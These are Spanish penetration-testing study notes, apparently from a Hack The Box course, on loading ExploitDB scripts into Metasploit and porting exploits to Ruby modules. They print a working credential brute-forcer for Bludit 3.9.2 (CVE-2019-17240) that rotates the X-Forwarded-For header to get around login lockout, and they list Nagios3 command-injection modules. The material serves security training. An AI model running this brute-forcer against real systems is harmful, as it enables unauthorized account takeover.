Para instalar cualquier módulo nuevo de Metasploit que ya haya sido portado por otros usuarios, uno puede optar por actualizar su `msfconsole` desde la terminal, lo que garantizará que todos los exploits, auxiliares y funciones más nuevos se instalen en la última versión de `msfconsole`. Siempre que los módulos portados se hayan insertado en la rama principal de Metasploit-framework en GitHub, deberíamos estar actualizados con los módulos más recientes.

[ExploitDB](https://www.exploit-db.com) es una excelente opción cuando se busca un exploit personalizado. Podemos utilizar etiquetas para buscar en los diferentes escenarios de explotación de cada script disponible. Una de estas etiquetas es [Metasploit Framework (MSF)](https://www.exploit-db.com/?tag=3) , que, si se selecciona, mostrará solo los scripts que también están disponibles en el formato del módulo Metasploit.

![[Pasted image 20240625042143.png]]

Digamos que queremos usar un exploit encontrado para `Nagios3`,pero no esta en Metasploit pero si en searchsploit.

#### Filtrando
```js
p314d0@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"

--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


Tenemos que descargar el `.rb`archivo y colóquelo en el directorio correcto. El directorio predeterminado donde se encuentran todos los módulos, scripts, complementos y `msfconsole` Los archivos propietarios se almacenan es `/usr/share/metasploit-framework`. Las carpetas críticas también tienen enlaces simbólicos en nuestras carpetas de inicio y raíz en las carpetas ocultas. `~/.msf4/` ubicación.

#### MSF - Estructura del directorio
```js
ls /usr/share/metasploit-framework/
```

```js
ls .msf4/
```

#### MSF: carga de módulos adicionales en tiempo de ejecución
```js
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
msfconsole -m /usr/share/metasploit-framework/modules/
```

#### MSF: carga de módulos adicionales
```js
msf6> loadpath /usr/share/metasploit-framework/modules/
```

Alternativamente, también podemos lanzar `msfconsole` y ejecutar el `reload_all`comando para que el módulo recién instalado aparezca en la lista.

```js
msf6 > reload_all
```


## Portación de scripts a módulos Metasploit
Para adaptar un script Python, PHP o cualquier tipo de exploit personalizado a un módulo Ruby para Metasploit, necesitaremos aprender el lenguaje de programación Ruby. Tenga en cuenta que los módulos Ruby para Metasploit siempre se escriben mediante pestañas físicas.

Al comenzar con un proyecto de transferencia, no necesitamos comenzar a codificar desde cero. En su lugar, podemos tomar uno de los módulos de explotación existentes de la categoría en la que encaja nuestro proyecto y reutilizarlo para nuestro script de transferencia actual. Recuerde mantener siempre organizados nuestros módulos personalizados para que nosotros y otros evaluadores de penetración podamos beneficiarnos de un entorno limpio y organizado cuando busquemos módulos personalizados.

Comenzamos eligiendo algún código de explotación para transferirlo a Metasploit. En este ejemplo, optaremos por [Bludit 3.9.2: omisión de mitigación de fuerza bruta de autenticación](https://www.exploit-db.com/exploits/48746) . Necesitaremos descargar el script, `48746.rb` y procedemos a copiarlo en el `/usr/share/metasploit-framework/modules/exploits/linux/http/`carpeta. Si arrancamos `msfconsole` Por el momento, sólo podremos encontrar un único `Bludit CMS`exploit en la misma carpeta que el anterior, lo que confirma que nuestro exploit aún no ha sido transferido. Es una buena noticia que ya exista un exploit de Bludit en esa carpeta porque lo usaremos como código repetitivo para nuestro nuevo exploit.

#### Portación de módulos MSF
```js
p314d0@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit

bludit_upload_images_exec.rb
```

```js
p314d0@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
```

Al inicio del archivo que copiamos, que es donde estaremos completando nuestra información, podemos notar el `include`declaraciones al comienzo del módulo repetitivo. Estos son los mixins mencionados en el `Plugins and Mixins` sección, y necesitaremos cambiarlos por los apropiados para nuestro módulo.

Si queremos encontrar los mixins, clases y métodos apropiados necesarios para que nuestro módulo funcione, necesitaremos buscar las diferentes entradas en la [documentación de Rubydoc Rapid7](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf) .

------------

## Escribiendo nuestro módulo

A menudo nos enfrentaremos a una red personalizada que ejecuta código propietario para atender a sus clientes durante evaluaciones específicas. La mayoría de los módulos que tenemos a mano ni siquiera hacen mella en su perímetro, y parece que no podemos escanear y documentar correctamente el objetivo con nada de lo que tenemos. Aquí es donde nos puede resultar útil desempolvar nuestras habilidades en Ruby y comenzar a codificar nuestros módulos.

Toda la información necesaria sobre la codificación de Metasploit Ruby se puede encontrar en la [página relacionada con Rubydoc.info Metasploit Framework](https://www.rubydoc.info/github/rapid7/metasploit-framework) . Desde escáneres hasta otras herramientas auxiliares, desde exploits personalizados hasta otros portados, codificar en Ruby para Framework es una habilidad sorprendentemente aplicable.

Mire a continuación un módulo similar que podemos usar como código repetitivo para nuestra transferencia de exploits. Este es el [exploit de vulnerabilidad de carga de archivos de imagen transversal del directorio Bludit](https://www.exploit-db.com/exploits/47699) , que ya se ha importado a `msfconsole`. Tómese un momento para reconocer todos los diferentes campos incluidos en el módulo antes de la prueba de concepto del exploit ( `POC`). Tenga en cuenta que este código no se ha modificado en el siguiente fragmento para que se ajuste a nuestra importación actual, sino que es una instantánea directa del módulo preexistente mencionado anteriormente. La información deberá ajustarse en consecuencia para el nuevo proyecto de transferencia.

#### Proof-of-Concept - Requirements

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::Report
```

Podemos mirar el `include`declaraciones para ver qué hace cada uno. Esto se puede hacer cotejándolos con la [documentación de Rubydoc Rapid7](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf) . A continuación se detallan sus respectivas funciones tal como se explica en la documentación:

|**Función**|**Descripción**|
|---|---|
|`Msf::Exploit::Remote::HttpClient`|Este módulo proporciona métodos para actuar como un cliente HTTP al explotar un servidor HTTP.|
|`Msf::Exploit::PhpEXE`|Este es un método para generar una carga útil PHP de primera etapa.|
|`Msf::Exploit::FileDropper`|Este método transfiere archivos y maneja la limpieza de archivos después de que se establece una sesión con el objetivo.|
|`Msf::Auxiliary::Report`|Este módulo proporciona métodos para informar datos a la base de datos de MSF.|
Al observar sus propósitos anteriores, llegamos a la conclusión de que no necesitaremos el método FileDropper y podemos eliminarlo del código final del módulo.

Vemos que existen diferentes apartados dedicados a la `info` página del módulo, la `options`sección. Los completamos adecuadamente, ofreciendo el crédito correspondiente a las personas que descubrieron el exploit, la información CVE y otros detalles relevantes.

#### Prueba de concepto: información del módulo
```ruby
def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
        parameter in the image upload feature in order to save a malicious payload anywhere
        onto the server, and then use a custom .htaccess file to bypass the file extension
        check to finally get remote code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'christasa', # Original discovery
          'sinn3r'     # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-16113'],
          ['URL', 'https://github.com/bludit/bludit/issues/1081'],
          ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-09-07",
      'DefaultTarget'  => 0))
```

#### Prueba de concepto: funciones
```ruby
 register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptString.new('BLUDITPASS', [true, 'The password for Bludit'])
      ])
  end
```

Mirando hacia atrás en nuestro exploit, vemos que se requerirá una lista de palabras en lugar de la `BLUDITPASS`variable para que el módulo aplique fuerza bruta a las contraseñas para el mismo nombre de usuario. Sería algo parecido al siguiente fragmento:
```ruby
OptPath.new('PASSWORDS', [ true, 'The list of passwords',
          File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
```

El resto del código de explotación debe ajustarse de acuerdo con las clases, métodos y variables utilizadas en la migración al Marco Metasploit para que el módulo funcione al final. La versión final del módulo quedaría así:

#### Prueba de concepto
```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report
  
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",
      'Description'    => %q{
        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rastating', # Original discovery
          '0ne-nine9'  # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-17240'],
          ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],
          ['PATCH', 'https://github.com/bludit/bludit/pull/1090' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-10-05",
      'DefaultTarget'  => 0))
      
     register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptPath.new('PASSWORDS', [ true, 'The list of passwords',
        	File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
      ])
  end
  
  # -- Exploit code -- #
  # dirty workaround to remove this warning:
#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
# see https://github.com/nahi/httpclient/issues/252
class WebAgent
  class Cookie < HTTP::Cookie
    def domain
      self.original_domain
    end
  end
end

def get_csrf(client, login_url)
  res = client.get(login_url)
  csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
end

def auth_ok?(res)
  HTTP::Status.redirect?(res.code) &&
    %r{/admin/dashboard}.match?(res.headers['Location'])
end

def bruteforce_auth(client, host, username, wordlist)
  login_url = host + '/admin/login'
  File.foreach(wordlist).with_index do |password, i|
    password = password.chomp
    csrf_token = get_csrf(client, login_url)
    headers = {
      'X-Forwarded-For' => "#{i}-#{password[..4]}",
    }
    data = {
      'tokenCSRF' => csrf_token,
      'username' => username,
      'password' => password,
    }
    puts "[*] Trying password: #{password}"
    auth_res = client.post(login_url, data, headers)
    if auth_ok?(auth_res)
      puts "\n[+] Password found: #{password}"
      break
    end
  end
end

#begin
#  args = Docopt.docopt(doc)
#  pp args if args['--debug']
#
#  clnt = HTTPClient.new
#  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--#wordlist'])
#rescue Docopt::Exit => e
#  puts e.message
#end
```

Si desea obtener más información sobre cómo transferir scripts al marco Metasploit, consulte el [libro Metasploit: una guía para probadores de penetración de No Starch Press](https://nostarch.com/metasploit) . Rapid7 también ha creado publicaciones de blog sobre este tema, que se pueden encontrar [aquí](https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/) .

